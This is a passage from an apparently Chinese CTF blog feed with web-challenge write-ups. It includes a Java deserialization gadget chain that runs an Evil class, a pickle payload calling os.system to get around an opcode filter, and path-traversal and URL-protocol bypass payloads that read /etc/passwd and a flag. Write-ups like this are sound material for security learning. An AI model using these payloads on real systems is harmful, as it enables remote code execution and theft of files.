class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.ezgame.ctf.tools.ToStringBean;<br><span class="hljs-keyword">import</span> com.ezgame.ctf.tools.Tools;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exec</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            ToStringBean payload = <span class="hljs-keyword">new</span> ToStringBean();<br><br>            File clzFile = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;C:\\Users\\86130\\Desktop\\Evil.class&quot;</span>);<br><br>            <span class="hljs-keyword">byte</span>[] clzBytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[(<span class="hljs-keyword">int</span>) clzFile.length()];<br><br>            FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(clzFile);<br>            fis.read(clzBytes); <span class="hljs-comment">//read file into bytes[]</span><br>            fis.close();<br><br>            payload.setClassByte(clzBytes);<br><br>            BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-string">&quot;placeholder&quot;</span>);<br>            Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>            field.setAccessible(<span class="hljs-keyword">true</span>);<br>            field.set(badAttributeValueExpException, payload);<br><br>            ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br><br>            ObjectOutputStream out = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br><br>            out.writeUTF(<span class="hljs-string">&quot;gadgets&quot;</span>);<br>            out.writeInt(<span class="hljs-number">2021</span>);<br>            <br>            <br>            <br>            <br>            <br>            out.writeObject(badAttributeValueExpException);<br><br>            <span class="hljs-comment">//String data = byteArrayOutputStream.toString();</span><br>            String data = Tools.base64Encode(byteArrayOutputStream.toByteArray());<br><br>            System.out.println(data);<br>            <span class="hljs-keyword">byte</span>[] b = Tools.base64Decode(data);<br>            InputStream inputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(b);<br>            ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(inputStream);<br>            String name = objectInputStream.readUTF();<br>            <span class="hljs-keyword">int</span> year = objectInputStream.readInt();<br>            <span class="hljs-keyword">if</span> (name.equals(<span class="hljs-string">&quot;gadgets&quot;</span>) &amp;&amp; year == <span class="hljs-number">2021</span>) &#123;<br>                objectInputStream.readObject();<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>Evil.javaä¸­å†™æ‰§è¡Œçš„å‘½ä»¤å°±è¡Œäº†</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> </span>&#123;<br>    <span class="hljs-keyword">static</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime r = Runtime.getRuntime();<br>            Process p = r.exec(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;);<br>            p.waitFor();<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="Eznode"><a href="#Eznode" class="headerlink" title="Eznode"></a>Eznode</h1><p>ç¬¬ä¸€æ­¥ç™»å½•æ—¶æ³¨å…¥ï¼Œ</p><p>è¦æ±‚æŸ¥è¯¢ç»“æœä¸è¾“å…¥çš„ç”¨æˆ·å¯†ç ç›¸åŒï¼Œè‡ªè¾“å‡ºï¼Œç¬¬äº”ç©ºé—´è€ƒè¿‡äº†ä¸€æ¬¡</p><p>ç¬¬äºŒæ­¥æ—¶hcbæ¨¡æ¿æ¸²æŸ“æ¼æ´ï¼Œå‚è€ƒ<a href="https://xz.aliyun.com/t/4695">https://xz.aliyun.com/t/4695</a></p><h1 id="apacheproy"><a href="#apacheproy" class="headerlink" title="apacheproy"></a>apacheproy</h1><p>æ‰“ç°æœ‰çš„cveï¼Œæ¯”èµ›çš„æ—¶å€™æ²¡å‘ç°ã€‚weblogicçš„åº”ç”¨ï¼Œç‰ˆæœ¬12.2.1.3</p><p>å‚è€ƒ<a href="https://www.jianshu.com/p/7d14e45a96e7">https://www.jianshu.com/p/7d14e45a96e7</a></p><h1 id="OldLibrary"><a href="#OldLibrary" class="headerlink" title="OldLibrary"></a>OldLibrary</h1><p>åˆæ˜¯goé¢˜</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é•¿åŸæ¯</title>
    <link href="/2021/11/01/2021-10-%E9%95%BF%E5%9F%8E%E6%9D%AF/"/>
    <url>/2021/11/01/2021-10-%E9%95%BF%E5%9F%8E%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="ez-python"><a href="#ez-python" class="headerlink" title="ez_python"></a>ez_python</h2><p>æ‰“å¼€é¦–é¡µï¼Œçœ‹çœ‹æºä»£ç ã€‚</p><p><img src="http://81.70.81.64/wp-content/uploads/2021/09/%E5%9B%BE%E7%89%87-177.png" alt="img"></p><p>è¿™é‡ŒçŒœæµ‹å°±æ˜¯å¯ä»¥è¯»å–æºç ï¼Œå…ˆè¯»/self/proc/cmdå¯ä»¥å‘ç°æºç æ—¶app.pyï¼Œè¯»å–æºç </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template,redirect,send_from_directory<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> send_file<br><br>app = Flask(__name__)<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span>():</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self,name,age</span>):</span><br>        self.name = name<br>        self.age = age<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;R&#x27;</span> <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">try</span>:<br>        user = base64.b64decode(request.cookies.get(<span class="hljs-string">&#x27;user&#x27;</span>))<br>        <span class="hljs-keyword">if</span> check(user):<br>            user = pickle.loads(user)<br>            username = user[<span class="hljs-string">&quot;username&quot;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            username = <span class="hljs-string">&quot;bad,bad,hacker&quot;</span><br>    <span class="hljs-keyword">except</span>:<br>        username = <span class="hljs-string">&quot;CTFer&quot;</span><br>    pic = <span class="hljs-string">&#x27;&#123;0&#125;.jpg&#x27;</span>.<span class="hljs-built_in">format</span>(random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">7</span>))<br>    <br>    <span class="hljs-keyword">try</span>:<br>        pic=request.args.get(<span class="hljs-string">&#x27;pic&#x27;</span>)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(pic, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            base64_data = base64.b64encode(f.read())<br>            p = base64_data.decode()<br>    <span class="hljs-keyword">except</span>:<br>        pic=<span class="hljs-string">&#x27;&#123;0&#125;.jpg&#x27;</span>.<span class="hljs-built_in">format</span>(random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">7</span>))<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(pic, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            base64_data = base64.b64encode(f.read())<br>            p = base64_data.decode()<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, uname=username, pic=p )<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">8888</span>)<br></code></pre></div></td></tr></table></figure><p>ä¸€çœ‹å°±æ˜¯pickleï¼Œbanäº†Ræ“ä½œç¬¦ï¼Œç”¨oå°±è¡Œäº†</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">(S<span class="hljs-string">&#x27;whoami&#x27;</span><br>ios<br>system<br>.<span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></div></td></tr></table></figure><h1 id="java-url"><a href="#java-url" class="headerlink" title="java_url"></a>java_url</h1><p>é¦–é¡µæºä»£ç ä¸­æœ‰ä¸€æ¡æ³¨é‡Šï¼ŒçŒœæµ‹å¯ä»¥ç›®å½•ç©¿è¶Šè¯»æ–‡ä»¶ã€‚</p><p><img src="http://81.70.81.64/wp-content/uploads/2021/09/%E5%9B%BE%E7%89%87-173.png" alt="img"></p><p><code>filename=../</code>ç¡®å®šå­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œ<code>download?filename=../../../../../../../../../etc/passwd</code>å¯è¯»ï¼Œå¹¶ä¸”æ³„éœ²tomcatçš„ç»å¯¹è·¯å¾„<code>/usr/local/tomcat/webapps/ROOT/WEB-INF/</code>ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>testurl<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.test2.aaa1.testURL<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>testurl<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/testURL<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>download<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.test2.aaa1.download<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>download<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/download<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>javaæ”¯æŒåè®®ï¼š</p><ul><li>file</li><li>http</li><li>https</li><li>ftp</li><li>netdoc</li><li>gopher</li></ul><p>è¯»æ–‡ä»¶</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">filename=../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/test2/aaa1/testURL.class<br> <br>filename=../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/test2/aaa1/download.class<br></code></pre></div></td></tr></table></figure><p>testURL.classä¸­å¯ä»¥é€šè¿‡<code>/testURL?url=url:file:///flag</code>æˆ–è€…<code>/testURL?url=%00file:///flag</code>æ¥è¿›è¡Œç»•è¿‡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">package</span> com.test2.aaa1;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.ServletOutputStream;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">download</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">1L</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">download</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        <span class="hljs-keyword">this</span>.doPost(request, response);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        String fileName = request.getParameter(<span class="hljs-string">&quot;filename&quot;</span>);<br>        <span class="hljs-keyword">if</span> (fileName.contains(<span class="hljs-string">&quot;environ&quot;</span>)) &#123;<br>            response.getWriter().write(<span class="hljs-string">&quot;false&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            fileName = <span class="hljs-keyword">new</span> String(fileName.getBytes(<span class="hljs-string">&quot;ISO8859-1&quot;</span>), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;filename=&quot;</span> + fileName);<br>            <span class="hljs-keyword">if</span> (fileName != <span class="hljs-keyword">null</span> &amp;&amp; fileName.toLowerCase().contains(<span class="hljs-string">&quot;flag&quot;</span>)) &#123;<br>                request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;no no no &quot;</span>);<br>                request.getRequestDispatcher(<span class="hljs-string">&quot;/message2.jsp&quot;</span>).forward(request, response);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                String fileSaveRootPath = <span class="hljs-keyword">this</span>.getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/upload&quot;</span>);<br>                String path = <span class="hljs-keyword">this</span>.findFileSavePathByFileName(fileName, fileSaveRootPath);<br>                File file = <span class="hljs-keyword">new</span> File(path + <span class="hljs-string">&quot;/&quot;</span> + fileName);<br>                <span class="hljs-keyword">if</span> (!file.exists()) &#123;<br>                    request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>);<br>                    request.getRequestDispatcher(<span class="hljs-string">&quot;/message2.jsp&quot;</span>).forward(request, response);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    String realname = fileName.substring(fileName.indexOf(<span class="hljs-string">&quot;_&quot;</span>) + <span class="hljs-number">1</span>);<br>                    response.setHeader(<span class="hljs-string">&quot;content-disposition&quot;</span>, <span class="hljs-string">&quot;attachment;filename=&quot;</span> + URLEncoder.encode(realname, <span class="hljs-string">&quot;UTF-8&quot;</span>));<br>                    FileInputStream in = <span class="hljs-keyword">new</span> FileInputStream(path + <span class="hljs-string">&quot;/&quot;</span> + fileName);<br>                    ServletOutputStream out = response.getOutputStream();<br>                    <span class="hljs-keyword">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>                    <span class="hljs-keyword">boolean</span> var11 = <span class="hljs-keyword">false</span>;<br><br>                    <span class="hljs-keyword">int</span> len;<br>                    <span class="hljs-keyword">while</span>((len = in.read(buffer)) &gt; <span class="hljs-number">0</span>) &#123;<br>                        out.write(buffer, <span class="hljs-number">0</span>, len);<br>                    &#125;<br><br>                    in.close();<br>                    out.close();<br>                &#125;<br>            &#125;<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">findFileSavePathByFileName</span><span class="hljs-params">(String filename, String saveRootPath)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> hashCode = filename.hashCode();<br>        <span class="hljs-keyword">int</span> dir1 = hashCode &amp; <span class="hljs-number">15</span>;<br>        <span class="hljs-keyword">int</span> dir2 = (hashCode &amp; <span class="hljs-number">240</span>) &gt;&gt; <span class="hljs-number">4</span>;<br>        String dir = saveRootPath + <span class="hljs-string">&quot;/&quot;</span> + dir1 + <span class="hljs-string">&quot;/&quot;</span> + dir2;<br>        File file = <span class="hljs-keyword">new</span> File(dir);<br>        <span class="hljs-keyword">if</span> (!file.exists()) &#123;<br>            file.mkdirs();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> dir;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>testURL.class</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">package</span> com.test2.aaa1;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLConnection;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">testURL</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">testURL</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        <span class="hljs-keyword">this</span>.doPost(req, resp);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        String tartget_url = req.getParameter(<span class="hljs-string">&quot;url&quot;</span>);<br>        String pri = tartget_url.substring(<span class="hljs-number">0</span>, tartget_url.indexOf(<span class="hljs-string">&quot;:&quot;</span>));<br>        <span class="hljs-keyword">if</span> (pri.matches(<span class="hljs-string">&quot;(?i)file|(?i)gopher|(?i)data&quot;</span>)) &#123;<br>            resp.getWriter().write(String.valueOf((<span class="hljs-keyword">new</span> StringBuilder()).append(<span class="hljs-string">&quot;false&quot;</span>)));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            resp.getWriter().write(String.valueOf(<span class="hljs-keyword">this</span>.getContent(tartget_url)));<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> StringBuilder <span class="hljs-title">getContent</span><span class="hljs-params">(String url)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        URL urL = <span class="hljs-keyword">new</span> URL(url);<br>        URLConnection con = urL.openConnection();<br>        BufferedReader in = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(con.getInputStream()));<br>        StringBuilder content = <span class="hljs-keyword">new</span> StringBuilder();<br><br>        String inputLine;<br>        <span class="hljs-keyword">while</span>((inputLine = 